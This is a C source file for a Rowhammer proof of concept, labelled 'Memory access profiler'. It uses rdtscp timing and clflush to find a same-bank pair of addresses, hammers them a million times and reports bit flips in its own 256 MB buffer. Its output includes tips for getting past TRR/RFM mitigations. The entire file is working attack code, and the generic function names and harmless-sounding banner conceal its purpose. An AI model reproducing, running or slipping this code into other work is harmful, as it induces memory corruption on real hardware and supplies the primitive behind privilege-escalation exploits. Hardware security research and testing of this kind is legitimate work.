#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <x86intrin.h>    

#define PARAM_A      (256 * 1024 * 1024)   
#define PARAM_B     1000000ULL             
#define PARAM_C   300                    
#define PARAM_D       64                     
#define PARAM_E       4096                   

static inline void func_a(volatile void *addr)
{
    _mm_clflush((void *)addr);
    _mm_mfence();          
}

static inline uint64_t func_b(void)
{
    uint32_t aux;
    _mm_lfence();                   
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
}

static uint64_t func_c(volatile char *a, volatile char *b)
{
    func_a(a);                 
    func_a(b);                 

    uint64_t t1 = func_b();   
    *a;                             
    *b;                             
    uint64_t t2 = func_b();   

    return t2 - t1;                 
}

static void func_d(volatile char *ptr_x,
                        volatile char *ptr_y,
                        uint64_t      local_n)
{
    for (uint64_t i = 0; i < local_n; i++) {
        *ptr_x;               
        *ptr_y;               
        _mm_clflush((void *)ptr_x);  
        _mm_clflush((void *)ptr_y);  
    }
    _mm_mfence();                   
}

static int func_e(uint8_t *buf, size_t size, uint8_t local_v)
{
    int local_c = 0;
    for (size_t i = 0; i < size; i++) {
        if (buf[i] != local_v) {
            printf("  [FLIP] offset=0x%06zx local_v=0x%02x got=0x%02x\n",
                   i, local_v, buf[i]);
            local_c++;
        }
    }
    return local_c;
}

int main(void)
{
    printf("=== Memory access profiler ===\n\n");

    
    uint8_t *buf = mmap(
        NULL, PARAM_A,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
        -1, 0
    );
    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    
    memset(buf, 0xFF, PARAM_A);
    printf("[*] Allocated %d MB at %p\n",
           PARAM_A >> 20, (void *)buf);

    
    printf("[*] Scanning for same-bank pair (this may take a moment)...\n");

    volatile char *ptr_x = NULL;
    volatile char *ptr_y = NULL;

    for (size_t i = 0; i < PARAM_A && !ptr_x; i += PARAM_E) {
        for (size_t j = i + PARAM_E * 2; j < PARAM_A; j += PARAM_E) {
            volatile char *a = (volatile char *)(buf + i);
            volatile char *b = (volatile char *)(buf + j);

            
            uint64_t local_t = 0;
            for (int s = 0; s < 10; s++) {
                uint64_t c = func_c(a, b);
                if (c > local_t) local_t = c;
            }

            if (local_t > PARAM_C) {
                ptr_x = a;
                ptr_y = b;
                printf("[*] Same-bank pair found:\n");
                printf("    aggressor A: offset 0x%06zx\n", i);
                printf("    aggressor B: offset 0x%06zx\n", j);
                printf("    latency:     %lu cycles (threshold: %d)\n\n",
                       local_t, PARAM_C);
                break;
            }
        }
    }

    if (!ptr_x) {
        printf("[-] No same-bank pair found.\n");
        printf("    Possible reasons:\n");
        printf("    - Modern DDR4/DDR5 with TRR/RFM mitigation\n");
        printf("    - Threshold needs tuning for this hardware\n");
        printf("    - Try increasing PARAM_A or adjusting PARAM_E\n");
        munmap(buf, PARAM_A);
        return 1;
    }

    
    printf("[*] Hammering %llu activations (double-sided)...\n",
           (unsigned long long)PARAM_B);
    func_d(ptr_x, ptr_y, PARAM_B);
    printf("[*] Hammering complete.\n\n");

    
    printf("[*] Scanning for bit flips...\n");
    int flips = func_e(buf, PARAM_A, 0xFF);

    if (flips > 0) {
        printf("\n[+] SUCCESS: %d bit flip(s) detected.\n", flips);
        printf("    This demonstrates rowhammer works on this hardware.\n");
    } else {
        printf("[-] No bit flips detected.\n");
        printf("    Hardware mitigations (TRR/RFM) may be active.\n");
        printf("    Try: increasing PARAM_B, different PARAM_C,\n");
        printf("         or running on older DDR3/DDR4 without mitigations.\n");
    }

    munmap(buf, PARAM_A);
    return 0;
}